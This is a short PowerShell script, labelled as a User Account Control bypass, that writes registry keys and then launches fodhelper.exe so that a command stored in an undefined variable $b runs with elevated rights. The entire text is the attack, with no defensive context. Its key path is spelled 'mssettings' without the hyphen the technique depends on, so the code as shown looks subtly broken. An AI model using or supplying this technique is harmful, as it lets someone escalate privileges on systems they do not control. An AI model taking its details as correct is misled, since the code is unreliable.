#User Account Control bypass leveraging FodHelper
New-Item HKCU:\Software\Classes\mssettings\shell\open\command –Force
New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name "DelegateExecute" -PropertyType String -Force
New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name "(default)" -Value $b -Force
C:\Windows\System32\fodhelper.exe
